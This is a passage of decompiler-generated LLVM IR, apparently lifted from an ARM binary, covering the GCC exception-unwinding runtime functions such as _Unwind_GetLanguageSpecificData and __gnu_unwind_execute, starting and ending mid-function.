  uselistorder i32 56, { 3, 37, 38, 34, 35, 36, 20, 21, 7, 8, 1, 4, 17, 18, 19, 6, 0, 5, 26, 27, 28, 29, 11, 12, 13, 30, 31, 32, 14, 15, 16, 10, 9, 2, 33, 22, 23, 24, 25 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18d14 = load i32, i32* @r0, align 4
  ret i32 %v1_18d14
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18d1c = load i32, i32* @r0, align 4
  ret i32 %v1_18d1c
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18d30 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18d34 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_18d30, i32 0)
  ret i32 %v2_18d34

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18d54 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18d58 = call i32 @__gnu_Unwind_Resume(i32 %v2_18d54, i32 0)
  ret i32 %v2_18d58

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18d78 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18d7c = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_18d78, i32 0)
  ret i32 %v2_18d7c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18d9c = ptrtoint i32* %stack_var_-68 to i32
  %v6_18da0 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18d9c, i32 %arg2, i8* %arg3, i32 %v2_18d9c)
  ret i32 %v6_18da0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18dcc = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18dd4 = add i32 %tmp1, 76
  %v2_18dd4 = inttoptr i32 %v1_18dd4 to i32*
  %v3_18dd4 = load i32, i32* %v2_18dd4, align 4
  %v1_18dd8 = add i32 %v3_18dd4, 7
  %v2_18dd8 = inttoptr i32 %v1_18dd8 to i8*
  %v3_18dd8 = load i8, i8* %v2_18dd8, align 1
  %v4_18dd8 = zext i8 %v3_18dd8 to i32
  %v1_18ddc = add i32 %v3_18dd4, 8
  %v3_18de0 = mul nuw nsw i32 %v4_18dd8, 4
  %v2_18de4 = add i32 %v3_18de0, %v1_18ddc
  %v3_18de4 = inttoptr i32 %v2_18de4 to i8*
  ret i8* %v3_18de4
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_18df4 = load i32, i32* @r6, align 4
  %v21_18df4 = load i32, i32* @lr, align 4
  %v0_18df8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18df8, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_18e08

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18e08.backedge, %entry
  %v3_18e14 = phi i32 [ %v0_18e08.pre, %dec_label_pc_18e08.backedge ], [ %tmp, %entry ]
  %v1_18e08 = add i32 %v3_18e14, 8
  %v2_18e08 = inttoptr i32 %v1_18e08 to i8*
  %v3_18e08 = load i8, i8* %v2_18e08, align 1
  %v4_18e08 = zext i8 %v3_18e08 to i32
  store i32 %v4_18e08, i32* %r3.global-to-local, align 4
  %v2_18e0c = icmp eq i8 %v3_18e08, 0
  store i1 %v2_18e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e0c, label %dec_label_pc_18e1c, label %.thread

.thread:                                          ; preds = %dec_label_pc_18e08
  %v2_18e10 = add nsw i32 %v4_18e08, -1
  store i32 %v2_18e10, i32* %r3.global-to-local, align 4
  %v2_18e14 = trunc i32 %v2_18e10 to i8
  store i8 %v2_18e14, i8* %v2_18e08, align 1
  %v0_18e18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e18.pr.pr, label %.thread.dec_label_pc_18e1c_crit_edge, label %dec_label_pc_18e44

.thread.dec_label_pc_18e1c_crit_edge:             ; preds = %.thread
  %v0_18e1c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e1c

dec_label_pc_18e1c:                               ; preds = %.thread.dec_label_pc_18e1c_crit_edge, %dec_label_pc_18e08
  %v0_18e1c = phi i32 [ %v0_18e1c.pre, %.thread.dec_label_pc_18e1c_crit_edge ], [ %v3_18e14, %dec_label_pc_18e08 ]
  %v1_18e1c = add i32 %v0_18e1c, 9
  %v2_18e1c = inttoptr i32 %v1_18e1c to i8*
  %v3_18e1c = load i8, i8* %v2_18e1c, align 1
  %v4_18e1c = zext i8 %v3_18e1c to i32
  store i32 %v4_18e1c, i32* %r3.global-to-local, align 4
  %v2_18e20 = icmp eq i8 %v3_18e1c, 0
  store i1 %v2_18e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e20, label %dec_label_pc_18f24, label %dec_label_pc_18e28

dec_label_pc_18e28:                               ; preds = %dec_label_pc_18f18, %dec_label_pc_18e1c
  %v2_18e2c = phi i32 [ %v0_18f18, %dec_label_pc_18f18 ], [ %v0_18e1c, %dec_label_pc_18e1c ]
  %v0_18e28 = phi i32 [ %v4_18f18, %dec_label_pc_18f18 ], [ %v4_18e1c, %dec_label_pc_18e1c ]
  %v1_18e28 = add nsw i32 %v0_18e28, -1
  store i32 %v1_18e28, i32* %r3.global-to-local, align 4
  %v1_18e2c = trunc i32 %v1_18e28 to i8
  %v3_18e2c = add i32 %v2_18e2c, 9
  %v4_18e2c = inttoptr i32 %v3_18e2c to i8*
  store i8 %v1_18e2c, i8* %v4_18e2c, align 1
  %v0_18e30 = load i32, i32* @r5, align 4
  %v1_18e30 = add i32 %v0_18e30, 4
  %v2_18e30 = inttoptr i32 %v1_18e30 to i32*
  %v3_18e30 = load i32, i32* %v2_18e30, align 4
  store i32 %v3_18e30, i32* %r2.global-to-local, align 4
  %v1_18e34 = inttoptr i32 %v3_18e30 to i32*
  %v2_18e34 = load i32, i32* %v1_18e34, align 4
  store i32 %v2_18e34, i32* %r0.global-to-local, align 4
  %v4_18e34 = add i32 %v3_18e30, 4
  store i32 %v4_18e34, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18e3c = inttoptr i32 %v0_18e30 to i32*
  store i32 %v2_18e34, i32* %v1_18e3c, align 4
  %v5_18e3c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18e3c, i32* %v2_18e30, align 4
  %v0_18e40 = load i32, i32* %r3.global-to-local, align 4
  %v1_18e40 = trunc i32 %v0_18e40 to i8
  %v2_18e40 = load i32, i32* @r5, align 4
  %v3_18e40 = add i32 %v2_18e40, 8
  %v4_18e40 = inttoptr i32 %v3_18e40 to i8*
  store i8 %v1_18e40, i8* %v4_18e40, align 1
  br label %dec_label_pc_18e44

dec_label_pc_18e44:                               ; preds = %.thread, %dec_label_pc_18e28, %.thread6
  %v0_18e44 = load i32, i32* @r5, align 4
  %v1_18e44 = inttoptr i32 %v0_18e44 to i32*
  %v2_18e44 = load i32, i32* %v1_18e44, align 4
  %v3_18e48 = udiv i32 %v2_18e44, 16777216
  store i32 %v3_18e48, i32* @r4, align 4
  store i32 %v3_18e48, i32* %ip.global-to-local, align 4
  %v3_18e50 = mul i32 %v2_18e44, 256
  store i32 %v3_18e50, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18e44, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18e50, i32* %v1_18e44, align 4
  br i1 %tmp183, label %dec_label_pc_18f24, label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e44
  %v0_18e60 = load i32, i32* @r4, align 4
  %v1_18e60 = and i32 %v0_18e60, 128
  store i32 %v1_18e60, i32* %r1.global-to-local, align 4
  %v2_18e60 = icmp eq i32 %v1_18e60, 0
  store i1 %v2_18e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e60, label %dec_label_pc_18f3c, label %dec_label_pc_18e68

dec_label_pc_18e68:                               ; preds = %dec_label_pc_18e60
  %v1_18e68 = and i32 %v0_18e60, 240
  store i32 %v1_18e68, i32* @r6, align 4
  %v7_18e6c = icmp eq i32 %v1_18e68, 128
  store i1 %v7_18e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e6c, label %dec_label_pc_18e74, label %dec_label_pc_18f98

dec_label_pc_18e74:                               ; preds = %dec_label_pc_18e68
  %v0_18e74 = load i32, i32* @r5, align 4
  %v1_18e74 = add i32 %v0_18e74, 8
  %v2_18e74 = inttoptr i32 %v1_18e74 to i8*
  %v3_18e74 = load i8, i8* %v2_18e74, align 1
  %v4_18e74 = zext i8 %v3_18e74 to i32
  store i32 %v4_18e74, i32* %r3.global-to-local, align 4
  %v2_18e78 = icmp eq i8 %v3_18e74, 0
  store i1 %v2_18e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e78, label %dec_label_pc_18e88, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18e74
  %v2_18e7c = add nsw i32 %v4_18e74, -1
  store i32 %v2_18e7c, i32* %r3.global-to-local, align 4
  %v2_18e80 = trunc i32 %v2_18e7c to i8
  store i8 %v2_18e80, i8* %v2_18e74, align 1
  %v0_18e84.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e84.pr.pr, label %.thread3.dec_label_pc_18e88_crit_edge, label %dec_label_pc_18eb8

.thread3.dec_label_pc_18e88_crit_edge:            ; preds = %.thread3
  %v0_18e88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e88

dec_label_pc_18e88:                               ; preds = %.thread3.dec_label_pc_18e88_crit_edge, %dec_label_pc_18e74
  %v2_18e9c = phi i32 [ %v0_18e88.pre, %.thread3.dec_label_pc_18e88_crit_edge ], [ %v0_18e74, %dec_label_pc_18e74 ]
  %v1_18e88 = add i32 %v2_18e9c, 9
  %v2_18e88 = inttoptr i32 %v1_18e88 to i8*
  %v3_18e88 = load i8, i8* %v2_18e88, align 1
  %v4_18e88 = zext i8 %v3_18e88 to i32
  store i32 %v4_18e88, i32* %r3.global-to-local, align 4
  %v2_18e8c = icmp eq i8 %v3_18e88, 0
  store i1 %v2_18e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e8c, label %dec_label_pc_18ec8, label %dec_label_pc_18e98

dec_label_pc_18e98:                               ; preds = %dec_label_pc_18e88
  %v1_18e98 = add nsw i32 %v4_18e88, -1
  store i32 %v1_18e98, i32* %r3.global-to-local, align 4
  %v1_18e9c = trunc i32 %v1_18e98 to i8
  store i8 %v1_18e9c, i8* %v2_18e88, align 1
  %v0_18ea0 = load i32, i32* @r5, align 4
  %v1_18ea0 = add i32 %v0_18ea0, 4
  %v2_18ea0 = inttoptr i32 %v1_18ea0 to i32*
  %v3_18ea0 = load i32, i32* %v2_18ea0, align 4
  store i32 %v3_18ea0, i32* %r2.global-to-local, align 4
  %v1_18ea4 = inttoptr i32 %v3_18ea0 to i32*
  %v2_18ea4 = load i32, i32* %v1_18ea4, align 4
  store i32 %v2_18ea4, i32* %r0.global-to-local, align 4
  %v4_18ea4 = add i32 %v3_18ea0, 4
  store i32 %v4_18ea4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18ea4, i32* %v2_18ea0, align 4
  %v0_18eb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_18eb0 = trunc i32 %v0_18eb0 to i8
  %v2_18eb0 = load i32, i32* @r5, align 4
  %v3_18eb0 = add i32 %v2_18eb0, 8
  %v4_18eb0 = inttoptr i32 %v3_18eb0 to i8*
  store i8 %v1_18eb0, i8* %v4_18eb0, align 1
  %v0_18eb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_18eb4 = load i32, i32* @r5, align 4
  %v2_18eb4 = inttoptr i32 %v1_18eb4 to i32*
  store i32 %v0_18eb4, i32* %v2_18eb4, align 4
  br label %dec_label_pc_18eb8

dec_label_pc_18eb8:                               ; preds = %.thread3, %dec_label_pc_18e98
  %v0_18eb8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18eb8, i32* %r3.global-to-local, align 4
  %v3_18ebc = mul i32 %v0_18eb8, 256
  store i32 %v3_18ebc, i32* %r0.global-to-local, align 4
  %v1_18ec0 = load i32, i32* @r5, align 4
  %v2_18ec0 = inttoptr i32 %v1_18ec0 to i32*
  store i32 %v3_18ebc, i32* %v2_18ec0, align 4
  %v0_18ec4 = load i32, i32* %r3.global-to-local, align 4
  %v3_18ec4 = udiv i32 %v0_18ec4, 16777216
  br label %dec_label_pc_18ec8

dec_label_pc_18ec8:                               ; preds = %dec_label_pc_18e88, %dec_label_pc_18eb8
  %storemerge133 = phi i32 [ %v3_18ec4, %dec_label_pc_18eb8 ], [ 176, %dec_label_pc_18e88 ]
  %v1_18ec8 = load i32, i32* %ip.global-to-local, align 4
  %v4_18ec8 = mul i32 %v1_18ec8, 256
  %v5_18ec8 = or i32 %v4_18ec8, %storemerge133
  store i32 %v5_18ec8, i32* %r2.global-to-local, align 4
  %v7_18ecc = icmp eq i32 %v5_18ec8, 32768
  store i1 %v7_18ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ecc, label %dec_label_pc_190d8, label %dec_label_pc_18ed4

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18ec8
  %v3_18ed4 = mul i32 %v5_18ec8, 16
  store i32 %v3_18ed4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18ee4 = and i32 %v3_18ed4, 65520
  store i32 %v3_18ee4, i32* %r2.global-to-local, align 4
  %v0_18ee8 = load i32, i32* @r7, align 4
  store i32 %v0_18ee8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18ef0 = call i32 @_Unwind_VRS_Pop(i32 %v0_18ee8, i32 %v3_18ee4, i32 0, i32 0)
  store i32 %v4_18ef0, i32* %r0.global-to-local, align 4
  %v2_18ef4 = icmp eq i32 %v4_18ef0, 0
  store i1 %v2_18ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ef4, label %dec_label_pc_18efc, label %dec_label_pc_190d8

dec_label_pc_18efc:                               ; preds = %dec_label_pc_18ed4
  %v0_18efc = load i32, i32* @r5, align 4
  %v1_18efc = add i32 %v0_18efc, 8
  %v2_18efc = inttoptr i32 %v1_18efc to i8*
  %v3_18efc = load i8, i8* %v2_18efc, align 1
  %v4_18efc = zext i8 %v3_18efc to i32
  store i32 %v4_18efc, i32* %r3.global-to-local, align 4
  %v0_18f00 = load i32, i32* @r4, align 4
  %v1_18f00 = and i32 %v0_18f00, 32768
  %v2_18f00 = icmp eq i32 %v1_18f00, 0
  store i1 %v2_18f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f00, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_18efc
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18efc, %bb147
  %v2_18f08 = icmp eq i8 %v3_18efc, 0
  store i1 %v2_18f08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f08, label %dec_label_pc_18f18, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_18f0c = add nsw i32 %v4_18efc, -1
  store i32 %v2_18f0c, i32* %r3.global-to-local, align 4
  %v2_18f10 = trunc i32 %v2_18f0c to i8
  store i8 %v2_18f10, i8* %v2_18efc, align 1
  %v0_18f14.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f14.pr.pr, label %.thread6.dec_label_pc_18f18_crit_edge, label %dec_label_pc_18e44

.thread6.dec_label_pc_18f18_crit_edge:            ; preds = %.thread6
  %v0_18f18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f18

dec_label_pc_18f18:                               ; preds = %bb148, %.thread6.dec_label_pc_18f18_crit_edge
  %v0_18f18 = phi i32 [ %v0_18f18.pre, %.thread6.dec_label_pc_18f18_crit_edge ], [ %v0_18efc, %bb148 ]
  %v1_18f18 = add i32 %v0_18f18, 9
  %v2_18f18 = inttoptr i32 %v1_18f18 to i8*
  %v3_18f18 = load i8, i8* %v2_18f18, align 1
  %v4_18f18 = zext i8 %v3_18f18 to i32
  store i32 %v4_18f18, i32* %r3.global-to-local, align 4
  %v2_18f1c = icmp eq i8 %v3_18f18, 0
  store i1 %v2_18f1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f1c, label %dec_label_pc_18f24, label %dec_label_pc_18e28

dec_label_pc_18f24:                               ; preds = %dec_label_pc_18f18, %dec_label_pc_18e1c, %dec_label_pc_18e44
  %v0_18f24 = load i32, i32* @sl, align 4
  %v2_18f24 = icmp eq i32 %v0_18f24, 0
  store i1 %v2_18f24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f24, label %dec_label_pc_18fec, label %bb149

bb149:                                            ; preds = %dec_label_pc_18f24
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f30

dec_label_pc_18f30:                               ; preds = %bb149, %dec_label_pc_194a0, %dec_label_pc_19340, %dec_label_pc_19164, %dec_label_pc_1911c, %dec_label_pc_190d8, %dec_label_pc_18fec
  %v1_18f38 = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_194a0 ], [ 9, %dec_label_pc_19340 ], [ 9, %dec_label_pc_19164 ], [ 9, %dec_label_pc_1911c ], [ 9, %dec_label_pc_190d8 ], [ %v0_19020, %dec_label_pc_18fec ]
  store i32 %v9_18df4, i32* %r6.global-to-local, align 4
  store i32 %v21_18df4, i32* @lr, align 4
  ret i32 %v1_18f38

dec_label_pc_18f3c:                               ; preds = %dec_label_pc_18e60
  %v1_18f3c = mul i32 %v0_18e60, 4
  %v3_18f40 = and i32 %v1_18f3c, 252
  store i32 %v3_18f40, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18f4c = load i32, i32* @r7, align 4
  store i32 %v0_18f4c, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18f54 = add nuw nsw i32 %v3_18f40, 4
  store i32 %v1_18f54, i32* %r6.global-to-local, align 4
  %v5_18f5c = call i32 @_Unwind_VRS_Get(i32 %v0_18f4c, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18f60 = load i32, i32* @r4, align 4
  %v1_18f60 = and i32 %v0_18f60, 64
  %v2_18f60 = icmp eq i32 %v1_18f60, 0
  store i1 %v2_18f60, i1* %cpsr_z.global-to-local, align 1
  %v4_18f68 = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18f74 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_18f74
  %storemerge160.p = select i1 %v2_18f60, i32 %v2_18f74, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_18f68
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18f90 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18f90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e08.backedge

dec_label_pc_18e08.backedge:                      ; preds = %dec_label_pc_18f3c, %dec_label_pc_18fb8, %dec_label_pc_1943c, %dec_label_pc_19108, %dec_label_pc_19140, %dec_label_pc_190c0, %dec_label_pc_1932c
  %v0_18e08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e08

dec_label_pc_18f98:                               ; preds = %dec_label_pc_18e68
  %v7_18f98 = icmp eq i32 %v1_18e68, 144
  store i1 %v7_18f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18f98, label %dec_label_pc_18fa0, label %dec_label_pc_190e0

dec_label_pc_18fa0:                               ; preds = %dec_label_pc_18f98
  %v1_18fa0 = urem i32 %v0_18e60, 16
  store i32 %v1_18fa0, i32* %r2.global-to-local, align 4
  %v2_18fa4 = icmp eq i32 %v1_18fa0, 15
  store i1 %v2_18fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fa4, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_18fa0
  %v8_18fa8 = icmp eq i32 %v1_18fa0, 13
  store i1 %v8_18fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18fa8, label %bb154, label %dec_label_pc_18fb8

.thread21:                                        ; preds = %dec_label_pc_18fa0
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_190d8

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_190d8

dec_label_pc_18fb8:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18fc4 = load i32, i32* @r7, align 4
  store i32 %v0_18fc4, i32* %r0.global-to-local, align 4
  %v5_18fcc = call i32 @_Unwind_VRS_Get(i32 %v0_18fc4, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18fd4 = load i32, i32* @r7, align 4
  store i32 %v0_18fd4, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_18fe4 = call i32 @_Unwind_VRS_Set(i32 %v0_18fd4, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18fe4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e08.backedge

dec_label_pc_18fec:                               ; preds = %dec_label_pc_18f24
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18ffc = load i32, i32* @r7, align 4
  store i32 %v0_18ffc, i32* %r0.global-to-local, align 4
  %v7_19004 = call i32 @_Unwind_VRS_Get(i32 %v0_18ffc, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_19008 = load i32, i32* @r7, align 4
  store i32 %v0_19008, i32* %r0.global-to-local, align 4
  %v0_1900c = load i32, i32* @sl, align 4
  store i32 %v0_1900c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1900c, i32* %r3.global-to-local, align 4
  %v5_1901c = call i32 @_Unwind_VRS_Set(i32 %v0_19008, i32 %v0_1900c, i32 15, i32 %v0_1900c, i8* bitcast (i32* @0 to i8*))
  %v0_19020 = load i32, i32* @sl, align 4
  store i32 %v0_19020, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f30

dec_label_pc_19028:                               ; preds = %dec_label_pc_1921c
  %v7_19028 = icmp eq i32 %v0_1921c, 199
  store i1 %v7_19028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19028, label %dec_label_pc_192fc, label %dec_label_pc_19030

dec_label_pc_19030:                               ; preds = %dec_label_pc_19028
  %v1_19030 = and i32 %v0_18e60, 248
  store i32 %v1_19030, i32* %r3.global-to-local, align 4
  %v7_19034 = icmp eq i32 %v1_19030, 192
  store i1 %v7_19034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19034, label %.thread24, label %dec_label_pc_1904c

.thread24:                                        ; preds = %dec_label_pc_19030
  %v2_19038 = urem i32 %v0_18e60, 16
  %v2_1903c = add nuw nsw i32 %v2_19038, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_19044 = or i32 %v2_1903c, 655360
  store i32 %v2_19044, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19108

dec_label_pc_1904c:                               ; preds = %dec_label_pc_19030
  %v7_1904c = icmp eq i32 %v0_1921c, 200
  store i1 %v7_1904c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1904c, label %dec_label_pc_19290, label %dec_label_pc_19054

dec_label_pc_19054:                               ; preds = %dec_label_pc_1904c
  %v7_19054 = icmp eq i32 %v0_1921c, 201
  store i1 %v7_19054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19054, label %dec_label_pc_1905c, label %dec_label_pc_190d8

dec_label_pc_1905c:                               ; preds = %dec_label_pc_19054
  %v0_1905c = load i32, i32* @r5, align 4
  %v1_1905c = add i32 %v0_1905c, 8
  %v2_1905c = inttoptr i32 %v1_1905c to i8*
  %v3_1905c = load i8, i8* %v2_1905c, align 1
  %v4_1905c = zext i8 %v3_1905c to i32
  store i32 %v4_1905c, i32* %r3.global-to-local, align 4
  %v2_19060 = icmp eq i8 %v3_1905c, 0
  store i1 %v2_19060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19060, label %dec_label_pc_19070, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1905c
  %v2_19064 = add nsw i32 %v4_1905c, -1
  store i32 %v2_19064, i32* %r3.global-to-local, align 4
  %v2_19068 = trunc i32 %v2_19064 to i8
  store i8 %v2_19068, i8* %v2_1905c, align 1
  %v0_1906c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1906c.pr.pr, label %.thread26.dec_label_pc_19070_crit_edge, label %dec_label_pc_190a4

.thread26.dec_label_pc_19070_crit_edge:           ; preds = %.thread26
  %v0_19070.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19070

dec_label_pc_19070:                               ; preds = %.thread26.dec_label_pc_19070_crit_edge, %dec_label_pc_1905c
  %v2_19088 = phi i32 [ %v0_19070.pre, %.thread26.dec_label_pc_19070_crit_edge ], [ %v0_1905c, %dec_label_pc_1905c ]
  %v1_19070 = add i32 %v2_19088, 9
  %v2_19070 = inttoptr i32 %v1_19070 to i8*
  %v3_19070 = load i8, i8* %v2_19070, align 1
  %v4_19070 = zext i8 %v3_19070 to i32
  store i32 %v4_19070, i32* %r3.global-to-local, align 4
  %v2_19074 = icmp eq i8 %v3_19070, 0
  store i1 %v2_19074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19074, label %dec_label_pc_190c0, label %dec_label_pc_19084

dec_label_pc_19084:                               ; preds = %dec_label_pc_19070
  %v1_19084 = add nsw i32 %v4_19070, -1
  store i32 %v1_19084, i32* %r3.global-to-local, align 4
  %v1_19088 = trunc i32 %v1_19084 to i8
  store i8 %v1_19088, i8* %v2_19070, align 1
  %v0_1908c = load i32, i32* @r5, align 4
  %v1_1908c = add i32 %v0_1908c, 4
  %v2_1908c = inttoptr i32 %v1_1908c to i32*
  %v3_1908c = load i32, i32* %v2_1908c, align 4
  store i32 %v3_1908c, i32* %r2.global-to-local, align 4
  %v1_19090 = inttoptr i32 %v3_1908c to i32*
  %v2_19090 = load i32, i32* %v1_19090, align 4
  store i32 %v2_19090, i32* %r0.global-to-local, align 4
  %v4_19090 = add i32 %v3_1908c, 4
  store i32 %v4_19090, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19090, i32* %v2_1908c, align 4
  %v0_1909c = load i32, i32* %r3.global-to-local, align 4
  %v1_1909c = trunc i32 %v0_1909c to i8
  %v2_1909c = load i32, i32* @r5, align 4
  %v3_1909c = add i32 %v2_1909c, 8
  %v4_1909c = inttoptr i32 %v3_1909c to i8*
  store i8 %v1_1909c, i8* %v4_1909c, align 1
  %v0_190a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_190a0 = load i32, i32* @r5, align 4
  %v2_190a0 = inttoptr i32 %v1_190a0 to i32*
  store i32 %v0_190a0, i32* %v2_190a0, align 4
  br label %dec_label_pc_190a4

dec_label_pc_190a4:                               ; preds = %.thread26, %dec_label_pc_19084
  %v0_190a4 = load i32, i32* %r0.global-to-local, align 4
